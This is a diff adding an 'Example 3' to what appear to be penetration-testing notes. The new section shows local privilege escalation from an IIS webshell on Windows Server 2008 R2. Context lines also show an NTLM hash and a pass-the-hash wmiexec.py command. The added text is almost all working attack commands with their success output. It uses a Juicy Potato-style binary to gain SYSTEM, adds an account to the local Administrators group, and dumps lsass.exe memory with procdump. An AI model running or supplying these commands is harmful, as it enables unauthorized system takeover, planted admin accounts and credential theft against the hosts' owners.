@@ -273,3 +273,26 @@ admin:1001:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP>
 
 > $ python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0<SNIP> admin@SQLserver04
 
+
+Example 3 - Local privesc with a webshell running as a IIS local service on a Windows Server 2008 R2
+=====================================================================================================
+
+The following commands were only working using the IE browser (it was not working with Firefox and Chrome):
+
+> http://X.X.X.X/webshell?command=E:\path\juicy_jfc.exe -l 8889 -p c:\Windows\System32\net.exe -a "localgroup Administrators audit-account /add" t *
+
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8889
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW OK
+
+
+> http://X.X.X.X/webshell?command=E:\path\juicy_jfc.exe -l 8889 -p E:\path\sysinternals\procdump.exe -a "-accepteula -ma lsass.exe E:\path\lsass-dump" t *
+
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 8889
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[-] CreateProcessWithTokenW OK
+
